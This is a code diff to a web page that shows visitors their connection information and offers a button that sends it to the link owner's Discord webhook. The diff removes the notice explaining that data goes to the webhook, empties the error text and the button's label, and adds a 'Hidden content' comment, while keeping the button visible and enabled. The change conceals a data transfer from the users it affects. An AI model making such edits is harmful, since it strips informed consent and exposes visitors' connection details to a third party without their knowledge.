@@ -112,6 +112,7 @@ h1 { font-size: 20px; margin-bottom: 4px; }
   <p class="notice" id="notice">
   </p>
   <button id="shareBtn" class="btn" style="display:none" disabled>
+  <!-- Hidden content -->
   </button>
   <p class="status" id="shareStatus"></p>
   <div class="grid" id="grid">
@@ -225,15 +226,13 @@ async function loadInfo() {
     });
 
     if (!$grid.children.length) {
-      $grid.textContent = 'Could not read your connection info.';
+      $grid.textContent = '';
     }
 
     document.getElementById('src').textContent = 'Data source: ' + res.src;
 
     if (shareMatch) {
       $notice.classList.add('warn');
-      $notice.textContent =
-        'This link supports voluntary sharing. Press the button below to send the connection information shown on this page to the link owner’s Discord webhook.';
       $shareBtn.style.display = 'block';
       $shareBtn.disabled = false;
     }
